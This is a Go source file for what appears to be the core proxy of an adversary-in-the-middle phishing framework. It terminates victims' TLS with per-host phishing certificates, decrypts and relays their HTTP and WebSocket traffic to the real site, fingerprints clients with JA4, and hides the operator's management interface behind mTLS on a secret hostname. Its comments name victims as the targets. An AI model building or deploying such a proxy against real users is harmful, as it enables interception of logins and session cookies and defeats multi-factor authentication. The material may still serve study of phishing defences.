package proxy

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

const upstreamTimeout = 30 * time.Second

type certSource interface {
	GetCertificate(hello *tls.ClientHelloInfo) (*tls.Certificate, error)
}

// AITMProxy is a reverse-proxy HTTPS server.
// It accepts raw TCP connections on port 443, peeks at the TLS ClientHello
// to capture bytes for JA4 fingerprinting, completes the TLS handshake using
// the SNI hostname to select the right certificate, then routes all decrypted
// HTTP traffic through the configured Pipeline.
type AITMProxy struct {
	CertSource     certSource
	Pipeline       *Pipeline
	WSHub          *WSHub
	Spoof          *SpoofProxy
	Logger         *slog.Logger
	SecretHostname string         // SNI hostname that triggers mTLS; empty disables mTLS
	ClientCAs      *x509.CertPool // required client CA pool when SecretHostname is set
}

// Start begins listening on addr (e.g. ":443") and blocks until ctx is cancelled.
func (p *AITMProxy) Start(ctx context.Context, addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("aitm: listen %s: %w", addr, err)
	}
	p.Logger.Info("aitm proxy started", "addr", addr)

	// Close the listener when ctx is cancelled so Accept unblocks.
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil
			default:
				return fmt.Errorf("aitm: accept: %w", err)
			}
		}
		go p.handleConn(conn)
	}
}

// handleConn is the per-connection goroutine.
// Flow:
//  1. Wrap in PeekedConn to capture raw ClientHello bytes for JA4.
//  2. Complete TLS handshake — GetCertificate uses the SNI hostname from the
//     ClientHello to select the right phishing certificate.
//  3. Allocate a ProxyContext for this connection.
//  4. Serve HTTP/1.1 over the decrypted connection via serveDecrypted().
func (p *AITMProxy) handleConn(rawConn net.Conn) {
	defer rawConn.Close()

	// Wrap in PeekedConn to tee the first TLS record before the handshake
	// consumes it. This gives us the raw ClientHello bytes for JA4 computation.
	peeked := NewPeekedConn(rawConn)

	// Complete the TLS handshake. crypto/tls calls GetCertificate with the
	// SNI hostname from the ClientHello, so we present the right cert per host.
	// GetConfigForClient applies mTLS only for the secret management hostname,
	// so phishing victims are never prompted for a client certificate.
	tlsConfig := &tls.Config{
		GetCertificate: p.CertSource.GetCertificate,
	}
	if p.ClientCAs != nil {
		secretHostname := p.SecretHostname
		clientCAs := p.ClientCAs
		tlsConfig.GetConfigForClient = func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
			if strings.EqualFold(hello.ServerName, secretHostname) {
				return &tls.Config{
					GetCertificate: p.CertSource.GetCertificate,
					ClientAuth:     tls.RequireAndVerifyClientCert,
					ClientCAs:      clientCAs,
				}, nil
			}
			return nil, nil
		}
	}
	tlsConn := tls.Server(peeked, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		p.Logger.Debug("aitm: TLS handshake failed", "error", err)
		return
	}
	defer tlsConn.Close()

	// Allocate a ProxyContext for this connection.
	pctx := &aitm.ProxyContext{
		RequestID:        newRequestID(),
		ClientHelloBytes: peeked.ClientHelloBytes(),
	}

	p.serveDecrypted(pctx, tlsConn)
}

// serveDecrypted reads HTTP requests from the decrypted connection, runs the
// request pipeline, forwards to upstream if not short-circuited, runs the
// response pipeline, and writes the response back.
func (p *AITMProxy) serveDecrypted(pctx *aitm.ProxyContext, conn net.Conn) {
	connReader := bufio.NewReader(conn)

	// http.ReadRequest never populates req.TLS; capture it once per connection
	// so authMiddleware can verify the client certificate on management requests.
	var tlsState *tls.ConnectionState
	if tlsConn, ok := conn.(*tls.Conn); ok {
		cs := tlsConn.ConnectionState()
		tlsState = &cs
	}

	for {
		req, err := http.ReadRequest(connReader)
		if err != nil {
			if !errors.Is(err, io.EOF) && !isConnReset(err) {
				p.Logger.Debug("aitm: reading request", "error", err)
			}
			return
		}
		req.TLS = tlsState
		req.URL.Scheme = "https"

		// Check for WebSocket upgrade to the hub endpoint.
		if isWebSocketUpgrade(req) && strings.HasPrefix(req.URL.Path, "/ws/") {
			sessionID := strings.TrimPrefix(req.URL.Path, "/ws/")
			if sessionID == "" {
				continue
			}
			rec := newHijackableResponseWriter(conn)
			pctx.ResponseWriter = rec
			p.WSHub.HandleUpgrade(rec, req, sessionID)
			return
		}

		// Wrap conn as a ResponseWriter so short-circuiting handlers can respond.
		rec := newBufferedResponseWriter(conn)
		pctx.ResponseWriter = rec

		// Run the request pipeline.
		if err := p.Pipeline.RunRequest(pctx, req); err != nil {
			if errors.Is(err, ErrShortCircuit) {
				rec.flush()
				if !rec.keepAlive {
					return
				}
				continue
			}
			p.Logger.Error("aitm: request pipeline", "error", err)
			rec.writeError(http.StatusBadGateway, "bad gateway")
			return
		}

		// Forward to upstream, run response pipeline, write back.
		// Returns false when the connection should be closed.
		if !p.serveOneRequest(pctx, req, conn, rec) {
			return
		}
	}
}

// serveOneRequest forwards req upstream, runs the response pipeline, and writes
// the response back to the client. Returns true if the connection should stay
// alive for the next request.
func (p *AITMProxy) serveOneRequest(pctx *aitm.ProxyContext, req *http.Request, conn net.Conn, rec *bufferedResponseWriter) bool {
	resp, err := p.forwardRequest(req)
	if err != nil {
		p.Logger.Error("aitm: forwarding request", "error", err)
		rec.writeError(http.StatusBadGateway, "bad gateway")
		return true // write error and keep connection alive
	}
	defer resp.Body.Close()

	if err := p.Pipeline.RunResponse(pctx, resp); err != nil && !errors.Is(err, ErrShortCircuit) {
		p.Logger.Error("aitm: response pipeline", "error", err)
	}

	if err := resp.Write(conn); err != nil {
		p.Logger.Debug("aitm: writing response", "error", err)
		return false
	}

	return !req.Close && !resp.Close
}

// forwardRequest sends req to the upstream origin and returns the response.
func (p *AITMProxy) forwardRequest(req *http.Request) (*http.Response, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
		DialContext: (&net.Dialer{
			Timeout:   upstreamTimeout,
			KeepAlive: upstreamTimeout,
		}).DialContext,
		ResponseHeaderTimeout: upstreamTimeout,
	}

	client := &http.Client{
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // don't follow redirects; let victim's browser do it
		},
	}

	// Clone the request for the upstream.
	upstreamReq := req.Clone(req.Context())
	upstreamReq.RequestURI = ""
	if upstreamReq.URL.Host == "" {
		upstreamReq.URL.Host = req.Host
	}

	resp, err := client.Do(upstreamReq)
	if err != nil {
		return nil, fmt.Errorf("upstream request: %w", err)
	}

	// Tag the response with the original request for sub-filter hostname matching.
	resp.Request = req
	return resp, nil
}

func isWebSocketUpgrade(req *http.Request) bool {
	return strings.EqualFold(req.Header.Get("Upgrade"), "websocket") &&
		strings.Contains(strings.ToLower(req.Header.Get("Connection")), "upgrade")
}

func isConnReset(err error) bool {
	return strings.Contains(err.Error(), "connection reset")
}

func newRequestID() string {
	buf := make([]byte, 8)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

// bufferedResponseWriter is a minimal http.ResponseWriter that writes to a net.Conn.
type bufferedResponseWriter struct {
	conn      net.Conn
	header    http.Header
	code      int
	buf       []byte
	keepAlive bool
}

func newBufferedResponseWriter(conn net.Conn) *bufferedResponseWriter {
	return &bufferedResponseWriter{
		conn:   conn,
		header: make(http.Header),
		code:   http.StatusOK,
	}
}

func (w *bufferedResponseWriter) Header() http.Header {
	return w.header
}

func (w *bufferedResponseWriter) WriteHeader(code int) {
	w.code = code
}

func (w *bufferedResponseWriter) Write(b []byte) (int, error) {
	w.buf = append(w.buf, b...)
	return len(b), nil
}

func (w *bufferedResponseWriter) flush() {
	resp := &http.Response{
		StatusCode: w.code,
		Header:     w.header,
		Proto:      "HTTP/1.1",
		ProtoMajor: 1,
		ProtoMinor: 1,
		Body:       io.NopCloser(strings.NewReader(string(w.buf))),
	}
	resp.ContentLength = int64(len(w.buf))
	resp.Write(w.conn)
}

func (w *bufferedResponseWriter) writeError(code int, msg string) {
	w.code = code
	w.buf = []byte(msg)
	w.flush()
}

// hijackableResponseWriter wraps a net.Conn and satisfies http.Hijacker for WebSocket upgrades.
type hijackableResponseWriter struct {
	conn   net.Conn
	header http.Header
	code   int
}

func newHijackableResponseWriter(conn net.Conn) *hijackableResponseWriter {
	return &hijackableResponseWriter{
		conn:   conn,
		header: make(http.Header),
		code:   http.StatusOK,
	}
}

func (w *hijackableResponseWriter) Header() http.Header {
	return w.header
}

func (w *hijackableResponseWriter) WriteHeader(code int) {
	w.code = code
}

func (w *hijackableResponseWriter) Write(b []byte) (int, error) {
	return w.conn.Write(b)
}

func (w *hijackableResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	brw := bufio.NewReadWriter(bufio.NewReader(w.conn), bufio.NewWriter(w.conn))
	return w.conn, brw, nil
}
